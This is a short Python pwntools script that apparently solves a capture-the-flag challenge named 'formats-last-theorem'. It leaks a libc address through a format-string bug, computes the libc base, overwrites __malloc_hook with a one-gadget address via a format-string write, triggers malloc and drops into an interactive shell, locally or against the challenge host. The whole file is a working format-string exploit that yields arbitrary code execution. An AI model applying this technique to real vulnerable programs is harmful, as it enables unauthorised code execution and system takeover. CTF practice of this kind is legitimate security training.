from pwn import *
from sys import *

context.arch='amd64'

libc = ELF('libc.so.6')
elf = ELF('./format')

p = process('./format')
HOST = 'dctf-chall-formats-last-theorem.westeurope.azurecontainer.io'
PORT = 7482

cmd = """
b*main
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

p.sendline("%23$p")
p.recvuntil("you entered\n")
leak = eval(p.recvline().rstrip())
libc.address = leak - 0x21bf7
print(hex(libc.address))
payload = fmtstr_payload(6, {libc.sym['__malloc_hook'] : libc.address+0x10a41c}, write_size='short')
p.sendline(payload)
p.sendline('%65537c')

p.interactive()